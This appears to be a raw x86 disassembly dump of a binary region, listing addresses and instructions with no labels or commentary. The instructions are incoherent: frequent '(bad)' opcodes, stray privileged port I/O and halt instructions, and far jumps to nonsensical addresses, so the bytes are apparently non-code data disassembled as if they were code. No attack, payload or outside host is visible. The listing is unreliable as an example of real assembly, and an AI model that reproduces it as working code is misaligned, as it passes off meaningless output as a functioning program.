  4b8a85:	je     0x4b8ad9
  4b8a87:	pop    ebp
  4b8a88:	mov    bh,0x3
  4b8a8a:	cmp    DWORD PTR [ebx],ecx
  4b8a8c:	xor    ecx,DWORD PTR [ebx]
  4b8a8e:	sbb    BYTE PTR [ecx+eax*2+0xa],dh
  4b8a92:	and    ecx,eax
  4b8a94:	into   
  4b8a95:	push   edi
  4b8a96:	cmp    BYTE PTR [ebx+0x691c8983],0x62
  4b8a9d:	mov    ecx,DWORD PTR [edi+0x7c61c233]
  4b8aa3:	mov    ecx,DWORD PTR [edi-0x36]
  4b8aa6:	jo     0x4b8a38
  4b8aa8:	in     eax,dx
  4b8aa9:	inc    esp
  4b8aaa:	jge    0x4b8a97
  4b8aac:	pop    esi
  4b8aad:	sub    edi,DWORD PTR [ebx+0x12]
  4b8ab0:	daa    
  4b8ab1:	(bad)  
  4b8ab3:	test   al,0x17
  4b8ab5:	(bad)  
  4b8ab6:	jnp    0x4b8ab9
  4b8ab8:	pop    es
  4b8ab9:	or     edx,DWORD PTR ds:0x31710a54
  4b8abf:	xor    eax,0x5dc038c8
  4b8ac4:	xchg   edi,eax
  4b8ac5:	jnp    0x4b8b17
  4b8ac7:	fsub   st,st(1)
  4b8ac9:	sbb    DWORD PTR [eax-0x3c277ddc],edx
  4b8acf:	jne    0x4b8b17
  4b8ad1:	sub    al,BYTE PTR [edx-0x50]
  4b8ad4:	inc    ebx
  4b8ad5:	pop    ds
  4b8ad6:	fcmove st,st(3)
  4b8ad8:	jge    0x4b8aeb
  4b8ada:	shufps xmm2,xmm2,0xf8
  4b8ade:	push   ds
  4b8adf:	ret    
  4b8ae0:	and    esi,edx
  4b8ae2:	jmp    0x402b8724
  4b8ae7:	cli    
  4b8ae8:	out    dx,eax
  4b8ae9:	push   ebx
  4b8aea:	imul   ebx,DWORD PTR [edx],0xa
  4b8aed:	inc    esi
  4b8aee:	cdq    
  4b8aef:	dec    eax
  4b8af0:	ficomp DWORD PTR [esi+0x6a]
  4b8af3:	xor    al,0xfa
  4b8af5:	icebp  
  4b8af6:	adc    eax,0xffb002a0
  4b8afb:	dec    ecx
  4b8afc:	lods   eax,DWORD PTR ds:[esi]
  4b8afd:	dec    ebx
  4b8afe:	nop
  4b8aff:	and    eax,0x7484f73b
  4b8b04:	cmp    ch,BYTE PTR [eax]
  4b8b06:	ja     0x4b8b65
  4b8b08:	clc    
  4b8b09:	sub    al,0x20
  4b8b0b:	cmc    
  4b8b0c:	jo     0x4b8b4c
  4b8b0e:	jno    0x4b8acd
  4b8b10:	add    BYTE PTR [edi],bl
  4b8b12:	and    al,0x3e
  4b8b14:	jno    0x4b8b29
  4b8b16:	mov    ebp,0xd0c190d2
  4b8b1b:	inc    edx
  4b8b1c:	int    0xdf
  4b8b1e:	les    eax,FWORD PTR [ecx+edx*2+0x3ee6d919]
  4b8b25:	ret    0x460b
  4b8b28:	(bad)  
  4b8b29:	cwde   
  4b8b2a:	lea    eax,[ebx+0x447382d1]
  4b8b30:	hlt    
  4b8b31:	cwde   
  4b8b32:	sub    eax,0x6d8cabf4
  4b8b37:	mov    eax,ds:0xf6b837b
  4b8b3c:	call   DWORD PTR [ebp+0x1c]
  4b8b3f:	pop    ds
  4b8b40:	xchg   edi,eax
  4b8b41:	fidiv  DWORD PTR [ecx]
  4b8b43:	or     al,0xcb
  4b8b45:	sub    esp,DWORD PTR [eax]
  4b8b47:	pusha  
  4b8b48:	push   esi
  4b8b49:	sub    dl,BYTE PTR [ebx+eax*8]
  4b8b4c:	sti    
  4b8b4d:	sbb    eax,DWORD PTR [esi]
  4b8b4f:	adc    dl,BYTE PTR [eax]
  4b8b51:	jmp    0x4b8b5c
  4b8b53:	adc    al,0x18
  4b8b55:	push   edx
  4b8b56:	mov    ecx,0x10734d34
  4b8b5b:	mov    edi,eax
  4b8b5d:	cmove  esp,esp
  4b8b60:	push   edi
  4b8b61:	lock sahf 
  4b8b63:	push   cs
  4b8b64:	add    DWORD PTR [edi-0x28],ecx
  4b8b67:	(bad)  
  4b8b68:	cmp    eax,ecx
  4b8b6a:	test   BYTE PTR [edx+esi*8+0x4e],cl
  4b8b6e:	push   ebx
  4b8b6f:	in     al,0x10
  4b8b71:	push   esi
  4b8b72:	shl    BYTE PTR [ecx],cl
  4b8b74:	cmp    eax,0x1af3c8a4
  4b8b79:	sbb    eax,0xeb0c0f49
  4b8b7e:	sub    esi,DWORD PTR [edi]
  4b8b80:	add    ebx,0x426a29d0
  4b8b86:	sbb    BYTE PTR [edi],dh
  4b8b88:	sbb    cl,BYTE PTR [eax]
  4b8b8a:	push   edx
  4b8b8b:	hlt    
  4b8b8c:	mov    edi,DWORD PTR [edi]
  4b8b8e:	push   edi
  4b8b8f:	jns    0x4b8b55
  4b8b91:	rcl    DWORD PTR [eax-0x6b],cl
  4b8b94:	add    dl,BYTE PTR [eax+0x38077988]
  4b8b9a:	hlt    
  4b8b9b:	pop    es
  4b8b9c:	lods   al,BYTE PTR ds:[esi]
  4b8b9d:	pop    edi
  4b8b9e:	push   0x16332a02
  4b8ba3:	inc    edx
  4b8ba4:	and    edi,DWORD PTR [esi-0x398a1011]
  4b8baa:	inc    ecx
  4b8bab:	sbb    bl,al
  4b8bad:	out    dx,eax
  4b8bae:	lea    esi,[esi+eiz*1-0x58]
  4b8bb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b8bb3:	cmp    al,0x40
  4b8bb5:	and    BYTE PTR [esi+0x60],cl
  4b8bb8:	sbb    DWORD PTR [esi-0x79],esi
  4b8bbb:	aad    0x30
  4b8bbd:	adc    DWORD PTR [eax-0x6b],edx
  4b8bc0:	inc    esi
  4b8bc1:	push   0x486dbd70
  4b8bc6:	sub    eax,esp
  4b8bc8:	jo     0x4b8b76
  4b8bca:	in     al,dx
  4b8bcb:	xchg   DWORD PTR ds:[edi],esp
  4b8bce:	xchg   esi,eax
  4b8bcf:	inc    edx
  4b8bd0:	add    dl,BYTE PTR [eax+0x60]
  4b8bd3:	jae    0x4b8c4c
  4b8bd5:	les    esp,FWORD PTR [ecx+0x30f22975]
  4b8bdb:	lock dec esi
  4b8bdd:	or     eax,0x89ef1967
  4b8be2:	or     al,0x24
  4b8be4:	sbb    cl,BYTE PTR [eax+0x5d]
  4b8be7:	xchg   esp,eax
  4b8be8:	mov    al,0xb0
  4b8bea:	ins    BYTE PTR es:[edi],dx
  4b8beb:	mov    esp,0x9520702a
  4b8bf0:	adc    al,BYTE PTR [esi+ebp*1]
  4b8bf3:	sub    BYTE PTR [edi+ecx*8],ch
  4b8bf6:	popa   
  4b8bf7:	gs jecxz 0x4b8c21
  4b8bfa:	xchg   edi,eax
  4b8bfb:	mov    ah,0x1d
  4b8bfd:	dec    eax
  4b8bfe:	adc    al,0x2
  4b8c00:	xor    al,0x31
  4b8c02:	inc    ebx
  4b8c03:	dec    ebp
  4b8c04:	push   eax
  4b8c05:	cmp    DWORD PTR [ecx+0x205360c4],ebp
  4b8c0b:	inc    eax
  4b8c0c:	sub    BYTE PTR [ebp-0x3f],ch
  4b8c0f:	lods   eax,DWORD PTR ds:[esi]
  4b8c10:	push   0xfffffffb
  4b8c12:	cmp    edi,DWORD PTR [eax]
  4b8c14:	xchg   ebp,eax
  4b8c15:	xchg   BYTE PTR [edx+0x5f],bl
  4b8c18:	mov    ds:0x6564226e,al
  4b8c1d:	inc    eax
  4b8c1e:	dec    esi
  4b8c1f:	mov    bl,0x8b
  4b8c21:	jmp    0xf706:0x3d35e00d
  4b8c28:	xchg   ebx,eax
  4b8c29:	push   ebx
  4b8c2a:	inc    esp
  4b8c2b:	add    dl,BYTE PTR [eax+0x7f]
  4b8c2e:	rcr    BYTE PTR [ebx+0x4e9befd4],1
  4b8c34:	push   esp
  4b8c35:	or     edx,0x26e606ec
  4b8c3b:	xor    eax,0x706aebf0
  4b8c40:	popa   
  4b8c41:	cmp    eax,esi
  4b8c43:	sub    DWORD PTR [eax],0x10
  4b8c46:	add    eax,0xb92799e7
  4b8c4b:	jae    0x4b8c53
  4b8c4d:	pop    ebp
  4b8c4e:	push   esp
  4b8c4f:	test   BYTE PTR [eax-0x24],bl
  4b8c52:	mov    al,0xa
  4b8c54:	pop    esp
  4b8c55:	mov    ds:0x7e4a4f55,eax
  4b8c5a:	sbb    DWORD PTR [esi+0x4eb73bdd],esp
  4b8c60:	xor    al,0x14
  4b8c62:	cld    
  4b8c63:	xor    BYTE PTR ds:0x2fbc1a46,dl
  4b8c69:	sub    al,0x48
  4b8c6b:	adc    eax,DWORD PTR [eax]
  4b8c6d:	sub    esi,DWORD PTR [ecx+0x7]
  4b8c70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b8c71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b8c72:	pop    ebp
  4b8c73:	(bad)  
  4b8c74:	mov    ebx,0x804adf14
  4b8c79:	pop    edx
  4b8c7a:	add    BYTE PTR [esi+0x13],dh
  4b8c7d:	sub    eax,0xeb74002d
  4b8c82:	aaa    
  4b8c83:	ins    DWORD PTR es:[edi],dx
  4b8c84:	inc    eax
  4b8c85:	sbb    eax,0x6b2019e3
  4b8c8a:	outs   dx,BYTE PTR ds:[esi]
  4b8c8b:	adc    DWORD PTR [ecx],eax
  4b8c8d:	lods   al,BYTE PTR ds:[esi]
  4b8c8e:	mov    dh,0x4c
  4b8c90:	inc    ebx
  4b8c91:	shl    DWORD PTR [ecx+0x31],0x44
  4b8c95:	mov    al,ds:0x248b56e1
  4b8c9a:	ficom  WORD PTR [eax-0x56]
  4b8c9d:	mov    dl,0x2d
  4b8c9f:	outs   dx,DWORD PTR ds:[esi]
  4b8ca0:	(bad)  
  4b8ca1:	and    DWORD PTR [esp+edx*4],ebp
  4b8ca4:	pop    esp
  4b8ca5:	popa   
  4b8ca6:	je     0x4b8ce0
  4b8ca8:	mov    eax,ds:0x8fe4990
  4b8cad:	jb     0x4b8cdf
  4b8caf:	inc    DWORD PTR [eax]
  4b8cb1:	and    BYTE PTR [eax+0x65],cl
  4b8cb4:	lods   eax,DWORD PTR ds:[esi]
  4b8cb5:	fs dec eax
  4b8cb7:	jnp    0x4b8cf7
  4b8cb9:	push   ss
  4b8cba:	shr    dl,cl
  4b8cbc:	jae    0x4b8c46
  4b8cbe:	or     al,0x34
  4b8cc0:	nop
  4b8cc1:	cmp    BYTE PTR [bp+0x50],dl
  4b8cc5:	push   eax
  4b8cc6:	jae    0x4b8ce8
  4b8cc8:	and    al,0x42
  4b8cca:	push   cs
  4b8ccb:	in     al,0xe4
  4b8ccd:	cmp    BYTE PTR [esp+eax*2],bh
  4b8cd0:	mov    eax,DWORD PTR [ebp-0x5e69dec]
  4b8cd6:	adc    BYTE PTR [esi],bl
  4b8cd8:	and    DWORD PTR [edx],0x16
  4b8cdb:	shl    BYTE PTR [esi+0x1ce27c81],cl
  4b8ce1:	or     DWORD PTR [ebx+ecx*2+0x1b072235],ecx
  4b8ce8:	xchg   edx,esp
  4b8cea:	fbld   TBYTE PTR [eax]
  4b8cec:	sbb    eax,0xcb3c037f
  4b8cf1:	and    DWORD PTR [eax],esp
  4b8cf3:	mov    eax,ds:0xf2a48c35
  4b8cf8:	jl     0x4b8d48
  4b8cfa:	xor    al,0x1c
  4b8cfc:	dec    esp
  4b8cfd:	daa    
  4b8cfe:	add    esi,edx
  4b8d00:	xor    ch,cl
  4b8d02:	xchg   esp,eax
  4b8d03:	push   ss
  4b8d04:	add    ebx,ebp
  4b8d06:	(bad)  
  4b8d07:	rol    DWORD PTR ds:0x43c15aa4,cl
  4b8d0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b8d0e:	inc    edi
  4b8d0f:	or     DWORD PTR [edi+0x7032e18b],eax
  4b8d15:	cmp    al,0x8e
  4b8d17:	dec    edi
  4b8d18:	sub    al,0x24
  4b8d1a:	das    
  4b8d1b:	push   es
  4b8d1c:	mov    ecx,0x8d2c03da
  4b8d21:	dec    DWORD PTR [esp+edi*4]
  4b8d24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b8d25:	jl     0x4b8cc7
  4b8d27:	(bad)  
  4b8d28:	pusha  
  4b8d29:	dec    esp
  4b8d2a:	or     ebx,ecx
  4b8d2c:	and    al,0x53
  4b8d2e:	retf   
  4b8d2f:	adc    al,0x48
  4b8d31:	jmp    0x6438:0xdd6ab902
  4b8d38:	add    eax,0x2b023160
  4b8d3d:	mov    ecx,0x6ba9b0bc
  4b8d42:	lds    esp,FWORD PTR [eax]
  4b8d44:	shl    DWORD PTR ds:0x4f8a1140,0x1b
  4b8d4b:	retf   
  4b8d4c:	pusha  
  4b8d4d:	inc    edi
  4b8d4e:	mov    ds:0xa401b634,eax
  4b8d53:	jbe    0x4b8d20
  4b8d55:	xor    edx,edi
  4b8d57:	fwait
  4b8d58:	jae    0x4b8dc2
  4b8d5a:	push   ecx
  4b8d5b:	pop    ss
  4b8d5c:	push   esp
  4b8d5d:	dec    esp
  4b8d5e:	pop    eax
  4b8d5f:	mov    edx,0x4085f2e
  4b8d64:	adc    al,0x26
  4b8d66:	push   esp
  4b8d67:	xchg   ebx,eax
  4b8d68:	and    DWORD PTR [ebp+0x0],edi
  4b8d6b:	push   0x438a2308
  4b8d70:	jmp    0x4b8d54
  4b8d72:	cmp    DWORD PTR [ebx+0x1adad0b],esp
  4b8d78:	imul   ebp,ecx,0x26
  4b8d7b:	fs dec ecx
  4b8d7d:	test   BYTE PTR [ebx-0x10c4b92e],dl
  4b8d83:	dec    esi
  4b8d84:	push   cs
  4b8d85:	jns    0x4b8de5
  4b8d87:	(bad)  
  4b8d88:	test   eax,0x505450a4
  4b8d8d:	xor    edx,DWORD PTR [ecx]
  4b8d8f:	js     0x4b8dd9
  4b8d91:	xor    eax,0xc3390b8b
  4b8d96:	shl    BYTE PTR [eax],cl
  4b8d98:	mov    ecx,0xd03b72d
  4b8d9d:	xor    BYTE PTR [ebx-0x4f],0xa0
  4b8da1:	(bad)  
  4b8da2:	jl     0x4b8d74
  4b8da4:	push   0x58
  4b8da6:	dec    eax
  4b8da7:	sub    bh,dl
  4b8da9:	arpl   WORD PTR [esi],dx
  4b8dab:	ror    BYTE PTR [esi+0x1fc9c789],cl
  4b8db1:	add    dh,BYTE PTR [esi]
  4b8db3:	push   edi
  4b8db4:	les    esi,FWORD PTR [eax-0x7f]
  4b8db7:	ins    DWORD PTR es:[edi],dx
  4b8db8:	add    DWORD PTR [edi],esi
  4b8dba:	inc    ebp
  4b8dbb:	rcl    esi,0xc5
  4b8dbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b8dbf:	sub    al,0xb6
  4b8dc1:	push   eax
  4b8dc2:	xchg   ecx,eax
  4b8dc3:	lds    esp,FWORD PTR [ebp-0x3f]
  4b8dc6:	jbe    0x4b8d7b
  4b8dc8:	mov    ebp,0x1629302
  4b8dcd:	in     eax,0x9d
  4b8dcf:	cmp    bl,BYTE PTR [edx+edx*8+0x74e044b1]
  4b8dd6:	jg     0x4b8e20
  4b8dd8:	add    eax,0x6509ab1e
  4b8ddd:	sbb    eax,0x8db02d09
  4b8de2:	xchg   ecx,eax
  4b8de3:	pop    esi
  4b8de4:	jnp    0x4b8dea
  4b8de6:	dec    ecx
  4b8de7:	js     0x4b8df9
  4b8de9:	xchg   edx,eax
  4b8dea:	repnz add ebx,edi
  4b8ded:	jmp    0x4b8e1c
  4b8def:	jo     0x4b8da1
  4b8df1:	fsub   QWORD PTR ds:0x25c329b4
  4b8df7:	adc    ebp,0x16
  4b8dfa:	jb     0x4b8e08
  4b8dfc:	(bad)  
  4b8dfd:	pop    esp
  4b8dfe:	add    dh,BYTE PTR [ecx+0x1ba011e9]
  4b8e04:	mov    cl,0x51
  4b8e06:	xchg   ecx,eax
  4b8e07:	test   eax,0xc9d81395
  4b8e0c:	pop    eax
  4b8e0d:	pop    eax
  4b8e0e:	sub    DWORD PTR [edi+esi*2],ecx
  4b8e11:	add    BYTE PTR [edx],ah
  4b8e13:	cmp    BYTE PTR [ebp+0x4a],dh
  4b8e16:	pop    ss
  4b8e17:	add    ebp,edx
  4b8e19:	sbb    DWORD PTR [edi+0x1dd5b090],0x27
  4b8e20:	mov    edi,0xb56db38e
  4b8e25:	mov    cl,0xa5
  4b8e27:	mov    edi,0x4cf27deb
  4b8e2c:	inc    eax
  4b8e2d:	rcr    BYTE PTR [edx],0x31
  4b8e30:	add    eax,0x376e8130
  4b8e35:	dec    eax
  4b8e36:	and    eax,0x241b40a7
  4b8e3b:	jp     0x4b8de9
  4b8e3d:	cmp    bl,0x34
  4b8e40:	and    ebx,DWORD PTR ds:0xc25861c
  4b8e46:	leave  
  4b8e47:	test   eax,0x46023408
  4b8e4c:	ins    DWORD PTR es:[edi],dx
  4b8e4d:	and    eax,0x69b82ce9
  4b8e52:	fsubr  QWORD PTR [edi+0x6173073d]
  4b8e58:	cmp    dl,BYTE PTR [edx+0x3060fe03]
  4b8e5e:	push   edi
  4b8e5f:	sbb    ah,BYTE PTR [esi]
  4b8e61:	test   BYTE PTR [eax-0x771a53b0],dl
  4b8e67:	jmp    0x478c5db6
  4b8e6c:	push   eax
  4b8e6d:	adc    al,0x9c
  4b8e6f:	sahf   
  4b8e70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b8e71:	jge    0x4b8e0c
  4b8e73:	mov    ds:0xcb8dae0,eax
  4b8e78:	pop    ds
  4b8e79:	cmp    BYTE PTR [edx],bl
  4b8e7b:	inc    edi
  4b8e7c:	push   ds
  4b8e7d:	xor    eax,esp
  4b8e7f:	sbb    eax,0x3588aebf
  4b8e84:	pusha  
  4b8e85:	push   ecx
  4b8e86:	add    DWORD PTR [ebx],edx
  4b8e88:	push   cs
  4b8e89:	add    edi,ecx
  4b8e8b:	pop    eax
  4b8e8c:	push   eax
  4b8e8d:	test   eax,0x2130a6c0
  4b8e92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b8e93:	mov    ds:0x61a1d5a6,eax
  4b8e98:	aas    
  4b8e99:	sub    bh,BYTE PTR [ebx]
  4b8e9b:	cdq    
  4b8e9c:	leave  
  4b8e9d:	and    edi,ecx
  4b8e9f:	add    DWORD PTR [esi-0x72c0bf78],ebp
  4b8ea5:	inc    ebp
  4b8ea6:	or     al,0xc9
  4b8ea8:	inc    eax
  4b8ea9:	and    BYTE PTR [ecx],bh
  4b8eab:	push   cs
  4b8eac:	cmp    al,0xc8
  4b8eae:	enter  0xa14d,0xc6
  4b8eb2:	push   ss
  4b8eb3:	(bad)  
  4b8eb4:	jmp    0x4b8e54
  4b8eb6:	and    esi,DWORD PTR [eax+0x35]
  4b8eb9:	push   es
  4b8eba:	outs   dx,DWORD PTR ds:[esi]
  4b8ebb:	mov    ds:0x7b2691c6,eax
  4b8ec0:	dec    edx
  4b8ec1:	and    BYTE PTR [eax+0x6784658],ah
  4b8ec7:	sbb    ecx,ebp
  4b8ec9:	adc    bl,BYTE PTR [ecx]
  4b8ecb:	pop    ecx
  4b8ecc:	mov    bl,0x14
  4b8ece:	dec    ebx
  4b8ecf:	xchg   esp,eax
  4b8ed0:	and    eax,0xd001494a
  4b8ed5:	adc    cl,0xb4
  4b8ed8:	rcr    BYTE PTR ds:0x8560798d,cl
  4b8ede:	cmp    ebx,edx
  4b8ee0:	test   DWORD PTR [ebx],eax
  4b8ee2:	add    ecx,edi
  4b8ee4:	or     BYTE PTR [eax+0x3997f43b],dh
  4b8eea:	jo     0x4b8efb
  4b8eec:	xchg   ch,dl
  4b8eee:	rol    dh,cl
  4b8ef0:	adc    cl,BYTE PTR [esi+0x44]
  4b8ef3:	xchg   ecx,eax
  4b8ef4:	push   0x8b17aa50
  4b8ef9:	add    DWORD PTR [edx],0x5b7504d5
  4b8eff:	sbb    dl,BYTE PTR [ecx-0x1f6ab560]
  4b8f05:	sub    eax,0x5b19f6dd
  4b8f0a:	pop    esi
  4b8f0b:	dec    ebx
  4b8f0c:	or     al,0xa
  4b8f0e:	jae    0x4b8f6b
  4b8f10:	pop    eax
  4b8f11:	add    BYTE PTR [ecx+0x56],cl
  4b8f14:	rol    DWORD PTR [eax+0x1d],1
  4b8f17:	sub    al,BYTE PTR [ebx]
  4b8f19:	not    DWORD PTR [ecx]
  4b8f1b:	and    BYTE PTR [eax-0x66],dl
  4b8f1e:	jne    0x4b8f57
  4b8f20:	push   edx
  4b8f21:	add    al,0x10
  4b8f23:	outs   dx,DWORD PTR ds:[esi]
  4b8f24:	retf   0x4ce9
  4b8f27:	xchg   edx,eax
  4b8f28:	into   
  4b8f29:	ins    BYTE PTR es:[edi],dx
  4b8f2a:	test   edi,esp
  4b8f2c:	rol    BYTE PTR [edx+0x38],cl
  4b8f2f:	aad    0x8e
  4b8f31:	sbb    eax,0x41daaac0
  4b8f36:	iret   
  4b8f37:	push   edi
  4b8f38:	int    0x54
  4b8f3a:	emms   
  4b8f3c:	es jns 0x4b8f91
  4b8f3f:	or     ah,dh
  4b8f41:	inc    ebx
  4b8f42:	and    BYTE PTR ds:0xe5019dd6,al
  4b8f48:	pop    eax
  4b8f49:	test   al,0xb4
  4b8f4b:	jl     0x4b8ed0
  4b8f4d:	daa    
  4b8f4e:	ror    DWORD PTR [edx],0x95
  4b8f51:	stc    
  4b8f52:	shr    DWORD PTR [edi],1
  4b8f54:	add    edi,DWORD PTR [edi-0x3452dc13]
  4b8f5a:	add    bh,BYTE PTR ds:0x8052504a
  4b8f60:	out    0x83,eax
  4b8f62:	(bad)  
  4b8f63:	shl    BYTE PTR [eax],0x20
  4b8f66:	push   ss
  4b8f67:	sbb    al,0x8e
  4b8f69:	add    al,0x6a
  4b8f6b:	cmp    eax,edx
  4b8f6d:	mov    eax,ds:0x1e2657b3
  4b8f72:	and    al,0xb0
  4b8f74:	scas   al,BYTE PTR es:[edi]
  4b8f75:	adc    al,0x4
  4b8f77:	push   es
  4b8f78:	push   ecx
  4b8f79:	test   eax,0xa9207277
  4b8f7e:	ror    BYTE PTR [ebx-0x7d],0x78
  4b8f82:	or     dh,BYTE PTR [ebp+0x7f]
  4b8f85:	inc    edi
  4b8f86:	and    al,0xbb
  4b8f88:	outs   dx,DWORD PTR ds:[esi]
  4b8f89:	sbb    cl,BYTE PTR [esi-0x12]
  4b8f8c:	or     BYTE PTR ss:[edx],0x2c
  4b8f90:	ins    BYTE PTR es:[edi],dx
  4b8f91:	iret   
  4b8f92:	aam    0xe9
  4b8f94:	mov    BYTE PTR [esi+esi*1],cl
  4b8f97:	popw   es
  4b8f99:	push   esi
  4b8f9a:	lock dec edx
  4b8f9c:	or     bl,BYTE PTR [edx-0x6cd78bb0]
  4b8fa2:	rol    BYTE PTR [eax+0x55832169],1
  4b8fa8:	sbb    bl,BYTE PTR [esi+ebx*1]
  4b8fab:	sub    al,0xd
  4b8fad:	fnsave [eax-0x66]
  4b8fb0:	jecxz  0x4b8f4a
  4b8fb2:	and    dh,ch
  4b8fb4:	ror    BYTE PTR [edx+0x66],0xf2
  4b8fb8:	push   0xffffffad
  4b8fba:	mov    ds:0x513f6a7d,eax
  4b8fbf:	icebp  
  4b8fc0:	leave  
  4b8fc1:	ja     0x4b8ff6
  4b8fc3:	xchg   ebx,eax
  4b8fc4:	jg     0x4b8fca
  4b8fc6:	fiadd  DWORD PTR [esi+0xda04fac]
  4b8fcc:	pop    es
  4b8fcd:	enter  0x2bac,0x63
  4b8fd1:	jo     0x4b900d
  4b8fd3:	mov    al,0x2d
  4b8fd5:	mov    ch,0x6a
  4b8fd7:	or     BYTE PTR [ecx+0x1d80b6a],cl
  4b8fdd:	xor    dh,BYTE PTR [eax*1+0x76c091fa]
  4b8fe4:	icebp  
  4b8fe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b8fe6:	leave  
  4b8fe7:	dec    esp
  4b8fe8:	inc    ecx
  4b8fe9:	(bad)  
  4b8fea:	lock test BYTE PTR [ebp-0x1d],cl
  4b8fee:	dec    ecx
  4b8fef:	push   ss
  4b8ff0:	fild   DWORD PTR [edi-0x52]
  4b8ff3:	adc    eax,0x3505142
  4b8ff8:	iret   
  4b8ff9:	cld    
  4b8ffa:	and    BYTE PTR [edx+0x330c79c4],0x24
  4b9001:	mov    esi,DWORD PTR [edi-0x3f5fae77]
  4b9007:	retf   
  4b9008:	lock pusha 
  4b900a:	xchg   esp,eax
  4b900b:	pop    esp
  4b900c:	push   edx
  4b900d:	fcom   DWORD PTR [eax]
  4b900f:	adc    al,0x2c
  4b9011:	sbb    DWORD PTR [ecx+edx*1],0xffffffb5
  4b9015:	adc    BYTE PTR [eax],bl
  4b9017:	pop    eax
  4b9018:	add    BYTE PTR [ebx-0x3759dc92],ch
  4b901e:	and    BYTE PTR [edi],dl
  4b9020:	pop    esp
  4b9021:	or     esp,DWORD PTR [eax+0x58]
  4b9024:	sub    al,BYTE PTR ds:0x1ff05e9
  4b902a:	sbb    BYTE PTR [ebx+edx*2],dh
  4b902d:	jb     0x4b8fc4
  4b902f:	pop    eax
  4b9030:	scas   eax,DWORD PTR es:[edi]
  4b9031:	adc    al,0xb3
  4b9033:	daa    
  4b9034:	iret   
  4b9035:	inc    ecx
  4b9036:	and    BYTE PTR [eax],0x4d
  4b9039:	inc    edi
  4b903a:	sbb    al,0x18
  4b903c:	push   edx
  4b903d:	enter  0x2033,0x28
  4b9041:	adc    al,0x8d
  4b9043:	retf   
  4b9044:	add    edx,edx
  4b9046:	popf   
  4b9047:	pop    esp
  4b9048:	sbb    BYTE PTR [eiz*8+0x1cd3495b],bl
  4b904f:	and    al,0x10
  4b9051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b9052:	aaa    
  4b9053:	add    edx,DWORD PTR [edi+0x7c31acb8]
  4b9059:	mov    ebp,0xc9a56545
  4b905e:	rol    ebp,0x41
  4b9061:	inc    esi
  4b9062:	fwait
  4b9063:	dec    eax
  4b9064:	aaa    
  4b9065:	daa    
  4b9066:	dec    ax
  4b9068:	(bad)  
  4b9069:	pop    eax
  4b906a:	ins    BYTE PTR es:[edi],dx
  4b906b:	cdq    
  4b906c:	mov    ebp,0x3b8eea23
  4b9071:	je     0x4b90e1
  4b9073:	or     edi,edx
  4b9075:	popf   
  4b9076:	adc    eax,0x190014bc
  4b907b:	push   cs
  4b907c:	jae    0x4b9090
  4b907e:	mov    eax,ds:0xffff7262
  4b9083:	inc    esi
  4b9084:	xlat   BYTE PTR ds:[ebx]
  4b9085:	popf   
  4b9086:	inc    edi
  4b9087:	mov    es,WORD PTR [edi+ebx*8+0x76e5a1d]
  4b908e:	enter  0xf052,0x62
  4b9092:	push   ecx
  4b9093:	dec    ecx
  4b9094:	push   esp
  4b9095:	(bad)  
  4b9096:	(bad)  
  4b9097:	add    al,0x70
  4b9099:	gs dec ebx
  4b909b:	add    cl,BYTE PTR [edx-0x3d]
  4b909e:	inc    esi
  4b909f:	in     eax,dx
  4b90a0:	mov    ah,0x20
  4b90a2:	xor    al,0x88
  4b90a4:	shl    DWORD PTR [ebp+0x85796a5],1
  4b90aa:	cdq    
  4b90ab:	sbb    eax,0xfa7515a2
  4b90b0:	and    al,0xa1
  4b90b2:	adc    eax,0xae116930
  4b90b7:	xor    DWORD PTR [ebp-0x4d6ed607],ecx
  4b90bd:	cmc    
  4b90be:	jmp    0x4b9099
  4b90c0:	inc    esp
  4b90c1:	cwde   
  4b90c2:	cmp    al,0xc
  4b90c4:	and    DWORD PTR [esi-0x5f],eax
  4b90c7:	mov    eax,ds:0x2fdfa2c1
  4b90cc:	or     BYTE PTR [ebp-0x75],dh
  4b90cf:	mov    ecx,0xfe570dc9
  4b90d4:	xchg   DWORD PTR [ecx+0x0],esp
  4b90d7:	shr    DWORD PTR [ebp-0x279dbafb],0x45
  4b90de:	sub    al,ah
  4b90e0:	cmp    DWORD PTR [edi+0x2574e983],esi
  4b90e6:	dec    ebp
  4b90e7:	loop   0x4b90e9
  4b90e9:	scas   eax,DWORD PTR es:[edi]
  4b90ea:	test   BYTE PTR [ebp+0x65],cl
  4b90ed:	dec    ebx
  4b90ee:	popa   
  4b90ef:	imul   ebx,DWORD PTR [ecx+0x18032705],0x36cf6749
  4b90f9:	inc    edx
  4b90fa:	ret    0x5ca5
  4b90fd:	cmp    esi,esp
  4b90ff:	dec    edi
  4b9100:	inc    BYTE PTR [edx+0x30]
  4b9103:	sub    ah,BYTE PTR [edx+edx*2]
  4b9106:	dec    ecx
  4b9107:	pop    ds
  4b9108:	inc    esp
  4b9109:	xor    eax,eax
  4b910b:	daa    
  4b910c:	ds je  0x4b9128
  4b910f:	mov    ecx,0xa5fc0d22
  4b9114:	sbb    DWORD PTR [edx],ebx
  4b9116:	push   ebp
  4b9117:	push   esi
  4b9118:	adc    al,0x40
  4b911a:	cmp    eax,ecx
  4b911c:	jb     0x4b9105
  4b911e:	fsubr  DWORD PTR [edx]
  4b9120:	add    eax,0xecfe47f8
  4b9125:	pop    es
  4b9126:	dec    esp
  4b9127:	adc    cl,BYTE PTR [ebx-0x7bf4e939]
  4b912d:	cmp    al,0xcd
  4b912f:	push   edi
  4b9130:	pop    ecx
  4b9131:	xor    BYTE PTR [edi-0x4f2ee1dc],bl
  4b9137:	add    al,0xa3
  4b9139:	rol    BYTE PTR [ebx-0x1f],0x47
  4b913d:	imul   edx,DWORD PTR [ebp-0x3d3c0fca],0xffffffd7
  4b9144:	fistp  DWORD PTR [ecx+0x2c]
  4b9147:	dec    ebx
  4b9148:	mov    bh,0x81
  4b914a:	jmp    0x24b484ba
  4b914f:	(bad)  
  4b9150:	loope  0x4b9152
  4b9152:	je     0x4b919a
  4b9154:	adc    ebx,ebp
  4b9156:	jne    0x4b91a9
